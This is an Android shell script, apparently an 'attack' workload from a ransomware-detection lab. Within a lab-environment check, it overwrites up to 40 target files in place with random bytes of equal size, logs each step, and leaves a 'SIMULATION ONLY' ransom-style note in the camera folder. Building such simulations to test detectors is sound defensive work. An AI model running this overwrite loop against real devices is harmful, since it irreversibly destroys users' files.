#!/system/bin/sh
# A1: In-place overwrite with random bytes of the exact same size
DIR="$(cd "$(dirname "$0")" && pwd)"
WORKLOAD_NAME="A1"
WORKLOAD_LABEL="attack"
. "$DIR/lib.sh"

MAX_FILES="${MAX_FILES:-40}"
DELAY="${DELAY:-0.05}"

verify_lab_env
log_truth "start"

OLD_IFS="$IFS"
IFS='
'
for f in $(list_attack_targets "$MAX_FILES"); do
    IFS="$OLD_IFS"
    if [ ! -f "$f" ]; then
        log_truth "skip" "$f"
        continue
    fi
    sz="$(file_size "$f")"
    head -c "$sz" /dev/urandom > "$f"
    log_truth "overwrite" "$f"
    sleep "$DELAY"
done
IFS="$OLD_IFS"

note="$TARGET_ROOT/DCIM/Camera/README_RESTORE.txt"
printf 'SIMULATION ONLY: Your files were overwritten in lab trial %s.\n' "$RUN_ID" > "$note"
log_truth "create" "$note"

log_truth "end"